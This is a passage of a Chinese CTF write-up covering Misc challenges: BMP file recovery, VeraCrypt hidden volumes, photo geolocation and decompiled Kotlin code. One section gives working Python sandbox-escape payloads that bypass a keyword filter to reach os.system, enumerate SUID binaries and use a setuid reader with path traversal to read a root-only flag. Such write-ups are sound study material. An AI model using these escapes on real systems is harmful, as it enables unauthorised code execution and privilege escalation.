class="string">b&#x27;flag&#123;Mutsumi?Mortis!She_conquered&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>flag{Mutsumi?Mortis!She_conquered}</strong></font>.</p>
<h1 id="Misc方向："><a href="#Misc方向：" class="headerlink" title="Misc方向："></a>Misc方向：</h1><h2 id="kotlin-："><a href="#kotlin-：" class="headerlink" title="kotlin?："></a>kotlin?：</h2><p>玩了两把就过了，<font color=deepskyblue><strong>flag{it_is_not_funny_to_use+korge}</strong></font>.</p>
<h2 id="r-g-b-："><a href="#r-g-b-：" class="headerlink" title="r!g!b!："></a>r!g!b!：</h2><p>发现是把一个任意二进制文件加密成bmp图像，通过带入找规律得到以下规律：输入的内容会三个字节一组按小端序填入一个像素的RGB，然后再由程序判断图像的长宽（填充成正方形），然后每一行有若干个像素（像素过多时还会填充一个额外的像素用于分隔），行与行之间也按小端序写入，发现secret.bmp有1063914字节，去掉bmp文件头（54字节）有1063860字节，而bmp图像为595*595，按填充计算为596*595*3，恰好为1063860字节，编写脚本恢复原文件的数据：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_and_reverse_bmp</span>(<span class="params">file_path, output_file_path, width=<span class="number">596</span>, height=<span class="number">595</span>, header_size=<span class="number">54</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.seek(header_size)</span><br><span class="line">        data = file.read()</span><br><span class="line">    processed_rows = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        start_index = row * width * <span class="number">3</span></span><br><span class="line">        end_index = start_index + (width - <span class="number">1</span>) * <span class="number">3</span> </span><br><span class="line">        row_data = data[start_index:end_index]</span><br><span class="line">        processed_row = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(row_data), <span class="number">3</span>):</span><br><span class="line">            r, g, b = row_data[i:i+<span class="number">3</span>]</span><br><span class="line">            processed_row.extend([b, g, r])</span><br><span class="line">        processed_rows.append(processed_row)</span><br><span class="line">    processed_rows.reverse()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> processed_rows:</span><br><span class="line">            output_file.write(row)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;处理完成，结果已写入到 <span class="subst">&#123;output_file_path&#125;</span>&quot;</span>)</span><br><span class="line">input_file_path = <span class="string">r&quot;E:/CTF/secret.bmp&quot;</span> </span><br><span class="line">output_file_path = <span class="string">r&quot;E:/CTF/output.bin&quot;</span> </span><br><span class="line">process_and_reverse_bmp(input_file_path, output_file_path)</span><br></pre></td></tr></table></figure>
<p>得到恢复文件后再将其带入程序进行加密，发现输出图像与原图像的二进制数据一模一样，证明恢复成功，查看恢复文件，发现了明显的ZIP文件开头，将其打开后发现了flag.docx，得到<font color=deepskyblue><strong>flag{17f8c2dea9b8aae825b25b406a071c43}</strong></font>.</p>
<h2 id="嘟嘟噜："><a href="#嘟嘟噜：" class="headerlink" title="嘟嘟噜："></a>嘟嘟噜：</h2><p>在jpg文件尾前面找到一个密钥<code>VC_is_1n7erst1n9</code>，用veracrypt解密1文件得到一个磁盘，挂载后打开得到一个<code>fake.txt</code>，又给了一个新的密钥<code>flag_is_hide</code>，再次解密得到一个隐藏磁盘，打开后有一个<code>flag(maybe).txt</code>，内容为hex的base64，解密得到flag：<font color=deepskyblue><strong>flag{VC_is_S0o00o_ea5Y!!!}</strong></font>.</p>
<h2 id="Escape-from-Dreams："><a href="#Escape-from-Dreams：" class="headerlink" title="Escape from Dreams："></a>Escape from Dreams：</h2><p>发现是黑盒，很多模块被禁用了，system等词也变成了过滤词，尝试了一大通之后发现_getframes没有被过滤，先获取当前文件路径：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">print</span>(sys._getframe(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;frame at <span class="number">0x7e1d64a49a80</span>, file <span class="string">&#x27;/home/ctf/server.py&#x27;</span>, line <span class="number">40</span>, code jail&gt;</span><br></pre></td></tr></table></figure>
<p>得到当前文件路径，接下来打印当前文件内容：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">118</span>](<span class="string">&quot;dummy&quot;</span>,<span class="string">&quot;/home/ctf/server.py&quot;</span>).get_data(<span class="string">&quot;/home/ctf/server.py&quot;</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;from pyfiglet import Figlet\r\nimport sys\r\n\r\nf = Figlet(font=\&#x27;slant\&#x27;)\r\nprint(f.renderText(\&#x27;Inception\&#x27;))\r\n\r\nban = [\&#x27;__loader__\&#x27;, \&#x27;__import__\&#x27;, \&#x27;compile\&#x27;, \&#x27;eval\&#x27;, \&#x27;exec\&#x27;, \&#x27;chr\&#x27;,\&#x27;locals\&#x27;,\&#x27;globals\&#x27;,\&#x27;bytes\&#x27;,\&#x27;type\&#x27;,\&#x27;open\&#x27;]\r\nmy_eval_func = eval\r\nmy_input_func = input\r\n\r\nfor m in ban:\r\n    del __builtins__.__dict__[m]\r\n#\xe6\xb2\x99\xe7\xae\xb1\xe9\x80\x83\xe9\x80\xb8\r\ndel __loader__,__builtins__\r\n\r\n\r\ndef jail():\r\n    print(&quot;Welcome to the Us3rr0r\&#x27;s dream&quot;)\r\n    print(&quot;Let\&#x27;s break free from this layer of dreams&quot;)\r\n    print(&quot;I heard that there is a problem with Us3rr0r\&#x27;s totem&quot;)\r\n    print(&quot;Enter \&#x27;exit\&#x27; to exit (*A*)&quot;)\r\n    while True:\r\n        input_data = my_input_func(&quot;&gt;&gt; &quot;)\r\n        if  &quot;help&quot;in input_data:\r\n            print(&quot;I can\&#x27;t help you QAQ&quot;)\r\n            continue\r\n        if &quot;breakpoint&quot; in input_data:\r\n            print(&quot;You can\&#x27;t break the dream QWQ&quot;)\r\n            continue\r\n        if input_data == &quot;exit&quot;:\r\n            print(&quot;Goodbye (&gt;^&lt;)&quot;)\r\n            break\r\n        if &quot;__builtins__&quot; in input_data:\r\n            print(&quot;Dreams do indeed have built-in flags p(ovo)q ~\xe2\x99\xaa ~\xe2\x99\xaa&quot;)\r\n            continue\r\n        if &quot;system&quot; in input_data:\r\n            print(&quot;There are no errors in the dream system (\xe2\x95\xaf\xc2\xb0\xe2\x96\xa1\xc2\xb0\xef\xbc\x89\xe2\x95\xaf&quot;)\r\n            continue\r\n        try:\r\n            my_eval_func(input_data)\r\n        except Exception as e:\r\n            print(&quot;Error:&quot;,e)\r\n\r\nif __name__ == &quot;__main__&quot;:\r\n    jail()\r\n\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>得到当前文件的Python脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyfiglet <span class="keyword">import</span> Figlet</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">f = Figlet(font=<span class="string">&#x27;slant&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f.renderText(<span class="string">&#x27;Inception&#x27;</span>))</span><br><span class="line"></span><br><span class="line">ban = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">my_eval_func = <span class="built_in">eval</span></span><br><span class="line">my_input_func = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ban:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"><span class="comment">#沙箱逃逸</span></span><br><span class="line"><span class="keyword">del</span> __loader__,__builtins__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the Us3rr0r&#x27;s dream&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s break free from this layer of dreams&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;I heard that there is a problem with Us3rr0r&#x27;s totem&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter &#x27;exit&#x27; to exit (*A*)&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        input_data = my_input_func(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&quot;help&quot;</span><span class="keyword">in</span> input_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I can&#x27;t help you QAQ&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;breakpoint&quot;</span> <span class="keyword">in</span> input_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t break the dream QWQ&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> input_data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Goodbye (&gt;^&lt;)&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;__builtins__&quot;</span> <span class="keyword">in</span> input_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Dreams do indeed have built-in flags p(ovo)q ~♪ ~♪&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;system&quot;</span> <span class="keyword">in</span> input_data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;There are no errors in the dream system (╯°□°）╯&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_eval_func(input_data)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jail()</span><br></pre></td></tr></table></figure>
<p>根据过滤规则构造payload：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">getattr</span>(f.renderText.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>],  <span class="string">&#x27;sys&#x27;</span>+<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;ls -l&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">total 92</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 12 12:56 bin</span><br><span class="line">drwxr-xr-x   2 root root  4096 Apr  2  2023 boot</span><br><span class="line">drwxr-xr-x   5 root root   360 Feb 23 09:54 dev</span><br><span class="line">-rwxr-xr-x   1 root root  1180 Feb 12 12:53 docker-entrypoint.sh</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 23 09:54 etc</span><br><span class="line">-r--------   1 root root    23 Feb 23 09:54 flag</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 12 12:56 home</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 12 12:56 lib</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 12 12:56 lib64</span><br><span class="line">drwxr-xr-x   2 root root  4096 Aug 14  2023 media</span><br><span class="line">drwxr-xr-x   2 root root  4096 Aug 14  2023 mnt</span><br><span class="line">drwxr-xr-x   2 root root  4096 Aug 14  2023 opt</span><br><span class="line">dr-xr-xr-x 306 root root     0 Feb 23 09:54 proc</span><br><span class="line">drwx------   1 root root  4096 Feb 12 12:56 root</span><br><span class="line">drwxr-xr-x   1 root root  4096 Feb 23 09:54 run</span><br><span class="line">drwxr-xr-x   2 root root  4096 Aug 14  2023 sbin</span><br><span class="line">drwxr-xr-x   2 root root  4096 Aug 14  2023 srv</span><br><span class="line">dr-xr-xr-x  13 root root     0 Feb 23 09:54 sys</span><br><span class="line">drwxrwxrwt   1 root root  4096 Feb 23 09:54 tmp</span><br><span class="line">-r-sr-xr-x   1 root root 16944 Feb 12 15:14 totem</span><br><span class="line">drwxr-xr-x   1 root root  4096 Aug 14  2023 usr</span><br><span class="line">drwxr-xr-x   1 root root  4096 Aug 14  2023 var</span><br></pre></td></tr></table></figure>
<p>发现flag只有root才能查看，因此还需要提权，查看能提权的程序：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">getattr</span>(f.renderText.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>],  <span class="string">&#x27;sys&#x27;</span>+<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;find / -type f -perm -4000 2&gt;/dev/null&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/totem</span><br></pre></td></tr></table></figure>

<p>发现了一个特殊的程序<code>/totem</code>，试着执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; getattr(f.renderText.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;],  &#x27;sys&#x27;+&#x27;tem&#x27;)(&#x27;/totem&#x27;)</span><br></pre></td></tr></table></figure>
<p>发现里面是个<code>cat</code>指令，用其查看flag：<code>../../../../flag</code></p>
<p>发现返回了flag的上半段：<font color=deepskyblue><strong>flag{h3y-h@Ve-y0U_eV3r</strong></font>，接着寻找下半段：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">getattr</span>(f.renderText.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;sys&#x27;</span>+<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;find . -type f -size -30c&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>发现了<code>./tmp/.flag</code></p>
<p>查看：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">getattr</span>(f.renderText.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>], <span class="string">&#x27;sys&#x27;</span>+<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;cat /./tmp/.flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到下半段：<font color=deepskyblue><strong>_533n-lncEpT10N61e11d}</strong></font></p>
<p>拼合得到flag：<font color=deepskyblue><strong>flag{h3y-h@Ve-y0U_eV3r_533n-lncEpT10N61e11d}</strong></font>.</p>
<h2 id="猜猜在哪："><a href="#猜猜在哪：" class="headerlink" title="猜猜在哪："></a>猜猜在哪：</h2><p>图片显示是一个动物园，语言是捷克语，右上角有一个LESY字样的logo，搜索lesy zoo搜到了<a target="_blank" rel="noopener" href="https://lhmp.cz/zachranna-stanice/lesni-zookoutky/zookoutek-kunratice/">页面</a>，是一个微型动物园，用<code>Zookoutek Kunraticez</code>作为密码，成功解压，但是得到的内容却是乱码，提取后得到<code>籯籵籪籰粄籱籪籿籮籨籯籾籷籨籲籷籨籙类籪籰籾籮粆</code>，rot8000得到flag：<font color=deepskyblue><strong>flag{have_fun_in_Prague}</strong></font>.</p>
<h2 id="kotlin-revenge："><a href="#kotlin-revenge：" class="headerlink" title="kotlin?revenge："></a>kotlin?revenge：</h2><p>不知道为什么进不去游戏，直接开逆！jadx反编译找到了一个叫<code>aes_iv</code>的class：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">aes_iv</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">encrypt</span> <span class="operator">=</span> <span class="string">&quot;6d5a46c10a49b801c93098bf5904c1df4e95f800649807ac3b88f96998ad08c223b1b4b5b1c3c94a0da480104f0dd4e7&quot;</span>;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">aes_iv</span> <span class="operator">=</span> <span class="string">&quot;1234567890abcdef&quot;</span>;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Object <span class="title function_">main</span><span class="params">(<span class="meta">@NotNull</span> Continuation&lt;? <span class="built_in">super</span> Unit&gt; continuation)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">m4065KorgefPpucE$default</span> <span class="operator">=</span> KorgeKt.m4065KorgefPpucE$<span class="keyword">default</span>(<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Size</span>(<span class="number">800</span>, <span class="number">600</span>), <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Size</span>(<span class="number">512</span>, <span class="number">512</span>), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, RGBA.m2628boximpl(Colors.INSTANCE.m2312getO1chRk(<span class="string">&quot;#2b2b2b&quot;</span>)), <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">false</span>, <span class="number">0.0d</span>, <span class="number">0</span>, <span class="literal">null</span>, <span class="number">0.0d</span>, <span class="keyword">new</span> <span class="title class_">MainKt$main$2</span>(<span class="literal">null</span>), continuation, -<span class="number">135397377</span>, <span class="number">63</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> m4065KorgefPpucE$<span class="keyword">default</span> == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? m4065KorgefPpucE$<span class="keyword">default</span> : Unit.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> controlWithKeyboard$<span class="keyword">default</span>(Stage stage, ImageDataView imageDataView, HitTestable hitTestable, Key key, Key key2, Key key3, Key key4, <span class="type">int</span> i, Object obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i &amp; <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            key = Key.UP;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i &amp; <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            key2 = Key.RIGHT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i &amp; <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            key3 = Key.DOWN;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i &amp; <span class="number">32</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            key4 = Key.LEFT;</span><br><span class="line">        &#125;</span><br><span class="line">        controlWithKeyboard(stage, imageDataView, hitTestable, key, key2, key3, key4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">controlWithKeyboard</span><span class="params">(<span class="meta">@NotNull</span> Stage $<span class="built_in">this</span>$controlWithKeyboard, <span class="meta">@NotNull</span> <span class="keyword">final</span> ImageDataView imageDataView, <span class="meta">@NotNull</span> <span class="keyword">final</span> HitTestable collider, <span class="meta">@NotNull</span> <span class="keyword">final</span> Key up, <span class="meta">@NotNull</span> <span class="keyword">final</span> Key right, <span class="meta">@NotNull</span> <span class="keyword">final</span> Key down, <span class="meta">@NotNull</span> <span class="keyword">final</span> Key left)</span> &#123;</span><br><span class="line">        ViewKt.addUpdater($<span class="built_in">this</span>$controlWithKeyboard, <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Stage, TimeSpan, Unit&gt;() &#123; <span class="comment">// from class: MainKt$controlWithKeyboard$1</span></span><br><span class="line">            <span class="comment">/* JADX INFO: Access modifiers changed from: package-private */</span></span><br><span class="line">            <span class="comment">/* JADX WARN: &#x27;super&#x27; call moved to the top of the method (can break code semantics) */</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">super</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">            <span class="keyword">public</span> <span class="comment">/* bridge */</span> <span class="comment">/* synthetic */</span> Unit <span class="title function_">invoke</span><span class="params">(Stage stage, TimeSpan timeSpan)</span> &#123;</span><br><span class="line">                m11invokehMs5a0(stage, timeSpan.m9123unboximpl());</span><br><span class="line">                <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* JADX WARN: Code restructure failed: missing block: B:20:0x0094, code lost:            if ((r18 == 0.0d) == false) goto L24;     */</span></span><br><span class="line">            <span class="comment">/* renamed from: invoke-hM-s5a0, reason: not valid java name */</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                Code decompiled incorrectly, please refer to instructions dump.</span></span><br><span class="line"><span class="comment">                To view partially-correct code enable &#x27;Show inconsistent code&#x27; option in preferences</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">m11invokehMs5a0</span><span class="params">(<span class="meta">@org</span>.jetbrains.annotations.NotNull korlibs.korge.view.Stage r11, <span class="type">double</span> r12)</span> &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Method dump skipped, instructions count: 335</span></span><br><span class="line"><span class="comment">                    To view this dump change &#x27;Code comments level&#x27; option to &#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Method not decompiled: defpackage.MainKt$controlWithKeyboard$1.m11invokehMs5a0(korlibs.korge.view.Stage, double):void&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">keepChildrenSortedByY</span><span class="params">(Container $<span class="built_in">this</span>$keepChildrenSortedByY)</span> &#123;</span><br><span class="line">        ViewKt.addUpdater($<span class="built_in">this</span>$keepChildrenSortedByY, <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Container, TimeSpan, Unit&gt;() &#123; <span class="comment">// from class: MainKt$keepChildrenSortedByY$1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">            <span class="keyword">public</span> <span class="comment">/* 